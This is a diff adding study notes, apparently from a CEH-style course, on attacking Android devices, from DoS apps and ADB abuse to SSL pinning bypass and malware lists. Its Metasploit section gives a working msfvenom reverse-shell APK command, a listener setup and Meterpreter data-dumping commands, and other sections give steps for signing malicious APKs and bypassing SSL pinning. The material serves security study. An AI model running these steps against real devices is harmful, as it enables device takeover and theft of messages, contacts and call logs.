@@ -12401,3 +12401,169 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 					- BadUSB attacks
 					- Evil AP MANA attacks on Android devices
 				- Additionally, Kali NetHunter allows attackers to generate custom payloads using Metasploit to compromise target networks. Users can simply select a payload, configure the necessary options, and generate a suitable exploit.
+		- Launching DoS Attack Using Low Orbit Ion Cannon (LOIC):
+			- LOIC is a mobile application that enables users to conduct DoS/DDoS attacks on a target IP address. This application can perform UDP, HTTP, or TCP flood attacks. It allows users to control traffic flow, send data packets to any IP address, utilize different attack methods (HTTP, UDP, or TCP), retrieve an IP address from a given web address, and send packets to a specified port.
+			- Steps to Launch DoS Attack:
+				- Download and install the LOIC Android application from the Google Play Store.
+				- Open the LOIC application.
+				- Enter the target IP address or URL in the "GET Target IP" field and click the "GET IP" button.
+				- Select the desired attack method by choosing one of the UDP, HTTP, or TCP radio buttons under the "Send Method" option.
+				- Specify the port number and the number of threads. Both values must be positive whole numbers.
+				- Click the "START" button at the bottom of the interface to initiate the DoS attack.
+		- Hacking with Orbot Proxy (orbot.app):
+			- Orbot is a proxy app that enhances privacy by allowing other applications to access the Internet securely. It uses the Tor network to encrypt Internet traffic and anonymize connections by routing them through a series of servers worldwide. While Orbot is designed for privacy and security, malicious actors may exploit it to conceal their identity while conducting cyberattacks or accessing target web applications.
+		- Exploiting an Android Device through ADB Using PhoneSploit Pro (github.com):
+			- Android Debug Bridge (ADB) is a command-line tool that allows attackers to communicate with a target Android device. This tool provides various features, such as installing and debugging apps and accessing the Unix shell to execute commands on the device. ADB can be connected via a USB cable or wirelessly. To use ADB wirelessly, the daemon server must be enabled on the target device using TCP port 5555.
+			- ADB acts as a bridge between the attacker’s PC and the target Android device, providing a command window to execute commands directly on the device. If the target device has TCP debugging enabled on port 5555, attackers can leverage tools like PhoneSploit Pro to perform various malicious activities, including screen capture, system information extraction, viewing running applications, port forwarding, installing/uninstalling apps, and toggling Wi-Fi on or off.
+		- Launching a Man-in-the-Disk (MITD) Attack:
+			- A man-in-the-disk (MITD) attack occurs when applications fail to implement proper security measures while using a device’s external storage. This vulnerability can lead to the installation of potentially malicious apps on the user’s device, blocking access to legitimate applications. MITD is a variation of a man-in-the-middle (MITM) attack.
+			- The Android OS has two types of storage: internal and external. Internal storage is sandboxed, restricting access to the app that owns it, whereas external storage is designed for file sharing between apps, making it more susceptible to MITD attacks.
+			- During a routine update, a legitimate app may store update files on external storage. An attacker monitors and manipulates this data, replacing or tampering with the update’s source code. Once the malicious code is injected into the update, the app unknowingly fetches and executes the altered code, installing a fraudulent application from the attacker.
+			- By using this malicious app, the attacker can bypass Android’s security mechanisms and gain access to sensitive information stored on the device, such as login credentials, personal information, contacts, and photos. In some cases, the attacker may even compromise hardware components such as microphones and cameras. The malicious app may also cause system crashes or gain full control of the device.
+			- Steps of an MITD Attack:
+				- The victim downloads and installs a legitimate app from an official app store.
+				- The victim’s device receives an app update and requests a code update from a cloud server.
+				- The victim grants permission for the legitimate app to access external storage, where the update files are stored.
+				- The attacker monitors the external storage and injects malicious code into the update files.
+				- The legitimate app fetches and executes the tampered update code from external storage.
+				- The malicious code triggers the installation of a fraudulent app from the attacker.
+				- Using this fraudulent app, the attacker can steal sensitive information or gain full control of the mobile device.
+		- Launching Spearphone Attack:
+			- A spearphone attack enables Android apps to record loudspeaker audio without requiring special permissions. Attackers can eavesdrop on voice conversations between remote mobile users by exploiting a hardware-based motion sensor, specifically the accelerometer.
+			- The accelerometer is a firmware chip embedded in most smartphones that detects changes in position and velocity. Since this sensor can be accessed by any installed app without special permissions, it poses a security risk. Because the loudspeaker and accelerometer share the same surface within the device, speech vibrations from the loudspeaker can be detected and recorded by the motion sensor.
+			- Attackers can leverage a malicious app to monitor loudspeaker output, capturing sensitive audio data such as voice assistant responses, multimedia messages, and audio files. Additionally, they can process this data using speech recognition and reconstruction techniques to identify speakers, classify gender, and analyze conversations—compromising users' speech privacy.
+		- Exploiting Android Devices Using Metasploit:
+			- The Metasploit Framework allows attackers to use custom or built-in exploits and payloads to compromise a target Android device and obtain sensitive information.
+			- Steps to Exploit an Android Device Using Metasploit:
+				- View Available Android Exploits and Payloads:
+					- Run the following commands to list Android-specific exploits and payloads:
+						- msf > search type:exploit platform:android
+						- msf > search type:payload platform:android
+				- Generate a Custom Payload:
+					- Use msfvenom to create a malicious APK file: msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=<Local Host IP Address> LPORT=<Port No> -o Desktop/Backdoor.apk
+					- Note: A listener must be opened on the system to establish a connection once the APK file is executed on the target device.
+				- Set Up a Listener on the Attacking Machine:
+					- Run the following commands in Metasploit to enable communication with the target device:
+						- msf > use exploit/multi/handler
+						- msf > set PAYLOAD android/meterpreter/reverse_tcp
+						- msf > set LHOST <Local Host IP Address>
+						- msf > set LPORT <Port No>
+						- msf > exploit
+				- Verify the Connection:
+					- After successfully compromising the target device, check its system information using: meterpreter > sysinfo
+				- Gather Sensitive Data:
+					- Use the following Meterpreter commands to extract data from the target device:
+						- View network configuration: meterpreter > ipconfig
+						- Display current directory: meterpreter > pwd
+						- List running processes: meterpreter > ps
+						- Extract SMS messages: meterpreter > dump_sms
+						- Retrieve call logs: meterpreter > dump_calllog
+						- Export saved contacts: meterpreter > dump_contacts
+						- List available webcams: meterpreter > webcam_list
+		- Analyzing Android Devices (OWASP MAS - mas.owasp.org):
+			- Analyzing Android devices involves examining the system to gather information, understand behavior, or identify vulnerabilities for various purposes. An attacker can analyze a targeted Android device by connecting it to their workstation and gaining shell access using the ADB command-line tool.
+			- Below are some of the tasks an attacker can perform while analyzing a connected Android device:
+				- Accessing the Android Device Through Shell:
+					- This technique allows an attacker to connect to an Android device over Wi-Fi instead of using a USB cable. It requires both the attacker’s machine and the target Android device to be on the same Wi-Fi network.
+					- The following steps outline this attack:
+						- Connect the Android device to the attacker's computer using a USB cable.
+						- Enable TCP/IP connections on port 5555 by running: adb tcpip 5555
+						- Disconnect the USB cable, then connect to the Android device over Wi-Fi using: adb connect <device_ip_address>
+						- Verify the connection by executing: adb devices
+						- Open a shell on the device: adb shell
+					- This technique assumes that the target device has Developer Mode and USB Debugging enabled.
+				- Enumerating Installed Applications:
+					- Once connected, an attacker can enumerate installed applications using ADB commands.
+					- To list all installed applications: adb shell pm list packages
+					- To list only third-party applications: adb shell pm list packages -3 -f
+					- Using the Frida tool to list installed applications: frida-ps -Uai
+						-a: All apps
+						-i: Currently installed
+						-U: Connected USB device
+				- Disassembling a Targeted App Package:
+					- Attackers can disassemble an app package using apktool, which decodes AndroidManifest.xml and other files.
+					- To unpack an APK file:
+						- apktool d <App_package>.apk
+						- tree
+					- This command extracts files such as AndroidManifest.xml, META-INF, assets, classes.dex, lib, res, and resources.arsc.
+				- Monitoring Logs:
+					- Attackers can capture logs from a targeted Android device using the logcat command.
+					- To store logs in a .log file: adb logcat > logcat.log
+				- Listing Open Files:
+					- To list open files for a specific process ID (pid), attackers can use: lsof -p <pid>
+				- Listing Open Connections:
+					- To check network activity for a specific process ID: netstat -p | grep <pid>
+				- Signing and Installing Malicious APKs:
+					- Attackers can sign malicious or repackaged APK files using a custom code-signing certificate.
+					- Generate a debug keystore (creates custom debug.keystore code-signing certificate): keytool -genkey -v -keystore ~/.android/debug.keystore -alias signkey -keyalg RSA -keysize 2048 -validity 20000
+					- Sign the malicious APK file with custom code-signing certificate using apksigner: apksigner sign --ks ~/.android/debug.keystore --ks-key-alias signkey <malicious file>.apk
+					- This process ensures that a modified APK can be installed on an Android device.
+		- Advanced SMS Phishing:
+			- An advanced SMS phishing attack is a type of phishing scam that exploits security vulnerabilities in the latest Android-based smartphones, primarily those manufactured by Samsung, Huawei, LG, and Sony. Attackers can execute this attack using a low-cost USB modem and deceive users into accepting new, malicious settings on their mobile devices. These settings can redirect the user's data to the attacker.
+			- The attack vector relies on a process called Over-the-Air (OTA) provisioning, which network operators commonly use to send provisioning data and updates to mobile devices remotely. Due to weak authentication methods, OTA is highly susceptible to phishing attacks. In this attack, the attacker sends messages that appear to be from a legitimate network operator. These messages contain malicious links that, when clicked, redirect internet traffic to the attacker.
+			- Before carrying out the attack, the attacker needs the victim's International Mobile Subscriber Identity (IMSI) number—a unique identifier assigned to every mobile device. With access to the IMSI, the attacker can ensure their malicious message is authenticated and processed by the victim's device. If the IMSI number is unavailable, the attacker must send two messages:
+				- The first message contains a PIN that appears to come from the victim’s network operator.
+				- The second message includes the malicious content, authenticated using the PIN from the first message.
+			- Once the victim enters the PIN, their mobile device is compromised. These phishing messages can alter message servers, mail servers, directory servers, and proxy addresses on Android-based smartphones.
+			- SMiShing attacks can be mitigated using security applications such as Harmony Mobile.
+		- Bypassing SSL Pinning:
+			- SSL pinning ensures that applications communicate only after validating trusted certificates and public keys. While it helps prevent MITM (Man-in-the-Middle) attacks, attackers can still bypass SSL pinning by exploiting misconfigurations in its implementation using various techniques.
+			- These techniques include reverse engineering, hooking, and automated tools such as Apktool, Frida, Keytool, and Jarsigner.
+			- Reverse Engineering:
+				- Attackers use tools like Apktool to decompile and recompile an application after modifying its code.
+				- Steps to Bypass SSL Pinning Using Reverse Engineering:
+					- Download and install Apktool (a command-line tool for decompiling and recompiling Android applications).
+					- Decompile the Android application using the following command: apktool d <application_name.apk>
+					- After decompilation, you gain access to the APK source code, including directories such as smali, build, smali_classes, assets, lib, unknown, original, and res.
+					- The smali directory contains the application's assembly code, including pre-installed Kotlin and Java code. Understanding this code is essential for modifying SSL pinning mechanisms.
+					- Locate functions like checkClientTrusted and checkServerTrusted, which validate X.509 digital certificates. These certificates contain the public key's bytecode. By modifying the output of these functions, you can bypass SSL pinning.
+					- Recompile the modified application using the following command: apktool b <application_directory_name>
+			- Hooking:
+				- The hooking technique allows attackers to tamper with an application’s runtime behavior. Tools like Frida enable attackers to inject malicious code, manipulate the application's original code, and bypass SSL pinning dynamically.
+				- To hook JavaScript code into a running Android application using Frida, use the following command: frida -U -l <hooking_file.js> -f <package_name>
+				- Note: Frida can also be used to perform hooking on iOS applications.
+		- Tap ’n Ghost Attack:
+			- Tap ’n Ghost is an advanced attack technique that exploits NFC-enabled Android devices. This attack specifically targets NFC technology and RX electrodes in the capacitive touchscreens of mobile devices. If an attacker establishes a remote connection with the target device, they can gain full control over it. Attackers typically use Bluetooth or Wi-Fi access points to create this remote connection.
+			- Tap ’n Ghost relies on two primary attack techniques: Tag-based Adaptive Ploy (TAP) and Ghost Touch Generator. By leveraging these methods, attackers can generate malicious events on a victim’s smartphone and remotely take control. This type of attack can also be executed on other devices, such as voting machines and ATMs.
+			- Tag-based Adaptive Ploy (TAP):
+				- TAP exploits the NFC feature to trigger an Android device to visit a specific URL without the victim’s consent. This is achieved using an NFC tag emulator, which works in conjunction with a web server that employs device fingerprinting techniques.
+			- Ghost Touch Generator:
+				- Ghost Touch Generator manipulates touch inputs to deceive the victim. It forces the victim to interact with a seemingly harmless cancel button, which, in reality, functions as a confirmation or permission button. As a result, the attacker can trick the victim into unknowingly granting remote access to their smartphone.
+		- Android Malware:
+			- Mamont (www.gdatasoftware.com):
+				- Mamont is an Android banking Trojan that masquerades as a Chrome browser application, deceiving users into unwittingly downloading and installing it. This type of malware is typically distributed via phishing emails and spam messages.
+				- Upon installation, the Trojan activates and prompts the user to grant specific permissions, including the ability to initiate and oversee phone calls, as well as send and receive SMS messages. It then tricks the user into believing they have won a cash prize, prompting them to input personal information such as phone numbers and credit card details.
+				- Additionally, the malware advises the user not to uninstall the app for 24 hours to claim the fake prize money. By employing this strategy, the Trojan prolongs its presence on the device, continuously extracting sensitive information.
+			- SecuriDropper
+			- Dwphon
+			- DogeRAT
+			- Tambir
+			- SoumniBot
+		- Android Hacking Tools:
+			- Attackers use various Android hacking tools to identify vulnerabilities and exploit target mobile devices to obtain critical user information, such as credentials, personal data, and contact lists.
+			- AndroRAT:
+				- AndroRAT is a tool designed to provide remote control over an Android system and retrieve information from it. It operates as a client-server application, with the client side developed in Java for Android and the server side in Python. AndroRAT establishes a persistent backdoor on the target device, automatically launching upon device boot-up. It can obtain details such as the device's current location, SIM card information, IP address, and MAC address.
+			- Ghost Framework:
+				- Ghost Framework is an Android post-exploitation tool that utilizes the Android Debug Bridge (ADB) to gain remote access to Android devices. This allows attackers to access the device shell without relying on OpenSSH or other protocols. The tool supports port forwarding and enables data extraction, including device logs, installed apps, MAC/INET addresses, battery status, network status, and current activity.
+				- Attackers can use Ghost Framework to:
+					- Install, uninstall, or run apps on a target device
+					- Extract APK files from installed apps
+					- Remove device passwords
+					- Record the device screen or take screenshots
+					- Extract files from the device
+					- Emulate button presses
+					- Manage Wi-Fi settings
+					- Extract WPA_supplicant files
+					- Shut down the device
+			- hxp_photo_eye (github.com)
+			- Gallery Eye (github.com)
+			- mSpy (www.mspy.com)
+			- Hackingtoolkit (github.com)
+			- Social-Engineer Toolkit (SET) (github.com)
+		- Android-based Sniffers:
+			- PCAPdroid (play.google.com): PCAPdroid is an open-source application that allows users to monitor, analyze, and capture network traffic on Android devices. It simulates a VPN to intercept network connections without requiring root access. Additionally, PCAPdroid processes all data locally on the device, eliminating the need for a remote server.
+			- NetCapture (play.google.com)
+			- Intercepter-NG (http://sniff.su)
+			- Packet Capture (play.google.com)
+			- Sniffer Wicap 2 Demo (www.9apps.com)
+			- Reqable API Testing & Capture (play.google.com)
